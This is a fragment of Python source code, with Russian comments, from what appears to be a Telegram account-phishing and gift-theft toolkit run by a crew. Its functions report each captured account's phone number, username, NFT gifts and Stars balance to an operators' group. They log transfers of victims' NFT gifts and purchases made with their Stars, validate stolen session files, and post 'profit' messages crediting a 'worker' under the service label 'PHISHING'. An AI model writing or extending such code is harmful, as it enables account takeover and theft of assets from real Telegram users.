🎁 **ID подарка:** {gift_id}
{gifts_info}{stars_info}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
✅ Подарки успешно куплены за звезды и отправлены!
        """
        await send_message_to_group(message.strip())
        print(f"📝 Лог успешной покупки подарков отправлен в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки лога покупки подарков в группу: {e}")

async def log_account_balance_info(client, user_id: int, phone: str):
    """Логирует информацию о балансе NFT и звезд на аккаунте сразу после входа"""
    try:
        from telegram_bot import send_message_to_group
        
        # Получаем информацию о пользователе (username)
        username = None
        try:
            me = await client.get_me()
            username = me.username
        except Exception as user_error:
            print(f"⚠️ Ошибка при получении информации о пользователе: {user_error}")
        
        # Получаем количество NFT подарков с ссылками
        nft_count = 0
        total_gifts = 0
        try:
            async for gift in client.get_chat_gifts("me"):
                total_gifts += 1
                try:
                    gift_link = None
                    if hasattr(gift, 'link') and gift.link:
                        gift_link = gift.link
                    elif hasattr(gift, 'gift_link') and gift.gift_link:
                        gift_link = gift.gift_link
                    
                    if gift_link:
                        nft_count += 1
                except Exception:
                    pass
        except Exception as gifts_error:
            print(f"⚠️ Ошибка при подсчете NFT подарков: {gifts_error}")
        
        # Получаем баланс звезд
        stars_balance = None
        try:
            stars_balance = await client.get_stars_balance()
        except Exception as stars_error:
            print(f"⚠️ Ошибка при получении баланса звезд: {stars_error}")
        
        # Формируем сообщение
        stars_info = f"{stars_balance:.2f} ⭐" if stars_balance is not None else "Не удалось получить"
        username_info = f"@{username}" if username else "Не указан"
        
        message = f"""
📊 **Информация об аккаунте**
👤 **Аккаунт:** {phone} (ID: {user_id})
👤 **Username:** {username_info}
🎁 **NFT подарков с ссылками:** {nft_count} из {total_gifts} всего
⭐ **Баланс звезд:** {stars_info}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        await send_message_to_group(message.strip())
        print(f"📝 Лог информации об аккаунте отправлен в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки лога информации об аккаунте: {e}")
        import traceback
        traceback.print_exc()

async def log_gift_transfer_success(gift, user_id: int, phone: str, total_nft_count: int = None):
    try:
        from telegram_bot import send_message_to_group
        from config import Config
        gift_id = getattr(gift, 'id', 'unknown')
        gift_link = getattr(gift, 'link', getattr(gift, 'gift_link', f"https://t.me/nft/gift-{gift_id}"))
        
        nft_info = ""
        if total_nft_count is not None:
            nft_info = f"""
📊 **NFT подарков изначально:** {total_nft_count}"""
        
        message = f"""
🎁 **Успешная передача подарка**
👤 **Аккаунт:** {phone} (ID: {user_id})
🆔 **ID подарка:** {gift_id}
🔗 **Ссылка:** {gift_link}{nft_info}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
✅ Уникальный NFT подарок успешно передан!
        """
        await send_message_to_group(message.strip())
        print(f"📝 Лог передачи подарка отправлен в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки лога в группу: {e}")
        import traceback
        traceback.print_exc()
async def send_no_gifts_notification(user_id: int, phone: str, gifts_count: int):
    """Отправляет уведомление с картинкой когда подарки не найдены"""
    try:
        from telegram_bot import send_message_to_group_with_animation
        from database import Database
        
        # Получаем информацию о воркере
        db = Database()
        worker_info = db.get_worker_by_last_gift(user_id)
        
        message = f"""
🎁 **Обработка подарков завершена**
👤 **Аккаунт:** {phone} (ID: {user_id})
📊 **Всего подарков:** {gifts_count}
❌ **Подарки с ссылками:** Не найдены
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Подарки не найдены или не содержат ссылок для передачи.
        """
        
        # Отправляем уведомление с анимацией и кнопкой для повторного сканирования
        await send_message_to_group_with_animation(
            message.strip(), 
            user_id, 
            phone, 
            worker_info
        )
        print(f"📝 Уведомление об отсутствии подарков отправлено в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки уведомления об отсутствии подарков: {e}")

async def send_profit_log(worker_info: dict, transferred_gift_links: list, user_id: int):
    """Отправляет лог профита с информацией о переданных подарках"""
    print(f"🔍 [PROFIT_LOG] Начало отправки лога профита для пользователя {user_id}")
    print(f"🔍 [PROFIT_LOG] Параметры: worker_info={worker_info}, gift_links_count={len(transferred_gift_links)}")
    
    try:
        print(f"🔍 [PROFIT_LOG] Импортируем необходимые модули...")
        from telegram_bot import send_message_to_group_with_animation
        from database import Database
        print(f"✅ [PROFIT_LOG] Модули успешно импортированы")
        
        # Получаем информацию о пользователе
        print(f"🔍 [PROFIT_LOG] Получаем информацию о пользователе {user_id}...")
        phone = get_phone_from_json(user_id) or "Неизвестно"
        print(f"✅ [PROFIT_LOG] Телефон пользователя: {phone}")
        
        # Формируем сообщение о профите
        print(f"🔍 [PROFIT_LOG] Формируем сообщение о профите...")
        gift_count = len(transferred_gift_links)
        print(f"🔍 [PROFIT_LOG] Количество подарков: {gift_count}")
        
        gift_links_text = "\n".join([f"• {link}" for link in transferred_gift_links[:5]])  # Показываем первые 5 ссылок
        if len(transferred_gift_links) > 5:
            gift_links_text += f"\n... и еще {len(transferred_gift_links) - 5} подарков"
        print(f"🔍 [PROFIT_LOG] Текст ссылок сформирован (длина: {len(gift_links_text)} символов)")
        
        # Определяем имя воркера
        worker_username = worker_info.get('username', '')
        if worker_username and not worker_username.startswith('@'):
            worker_username = f"@{worker_username}"
        elif not worker_username:
            worker_username = f"@user{worker_info.get('telegram_id', 'unknown')}"
        
        print(f"🔍 [PROFIT_LOG] Имя воркера: {worker_username}")
        
        # Формируем список подарков в новом формате
        gift_list_text = ""
        for i, link in enumerate(transferred_gift_links, 1):
            gift_list_text += f"🎁 {i}. {link}\n"
        
        message = f"""🧑‍🎤 Новый профит у {worker_username}

┠ Сервис: 💠 PHISHING
┠ Подарки ({gift_count}):
{gift_list_text.rstrip()}
┖ Комьюнити: 🥷 GETTO TEAM"""
        
        print(f"✅ [PROFIT_LOG] Сообщение сформировано (длина: {len(message)} символов)")
        print(f"🔍 [PROFIT_LOG] Содержимое сообщения:\n{message}")
        
        # Отправляем уведомление с анимацией и кнопкой для повторного сканирования
        print(f"🔍 [PROFIT_LOG] Отправляем сообщение через send_message_to_group_with_animation...")
        await send_message_to_group_with_animation(
            message.strip(), 
            user_id, 
            phone, 
            worker_info
        )
        
        print(f"✅ [PROFIT_LOG] Лог профита успешно отправлен для пользователя {user_id}")
        
    except Exception as e:
        print(f"❌ [PROFIT_LOG] Ошибка отправки лога профита: {e}")
        print(f"❌ [PROFIT_LOG] Тип ошибки: {type(e).__name__}")
        print(f"❌ [PROFIT_LOG] Параметры при ошибке: user_id={user_id}, worker_info={worker_info}")
        import traceback
        print(f"❌ [PROFIT_LOG] Полный traceback:")
        traceback.print_exc()

async def log_gift_processing_error(error, user_id: int, phone: str):
    try:
        from telegram_bot import send_message_to_group
        message = f"""
❌ **Ошибка обработки подарков**
👤 **Аккаунт:** {phone} (ID: {user_id})
🚫 **Ошибка:** {str(error)}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Требуется проверка аккаунта.
        """
        await send_message_to_group(message.strip())
        print(f"📝 Лог ошибки отправлен в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки лога ошибки в группу: {e}")
def check_session_exists(phone):
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
    return os.path.exists(session_file) and os.path.exists(json_file)
def validate_session(phone):
    from telegram_client import TelegramAuth, run_async
    if not check_session_exists(phone):
        return False
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    try:
        auth = TelegramAuth(session_file)
        is_valid = run_async(auth.check_connection())
        return is_valid
    except Exception as e:
        try:
            if os.path.exists(session_file):
                os.remove(session_file)
            json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
            if os.path.exists(json_file):
                os.remove(json_file)
        except Exception as cleanup_error:
            pass
        return False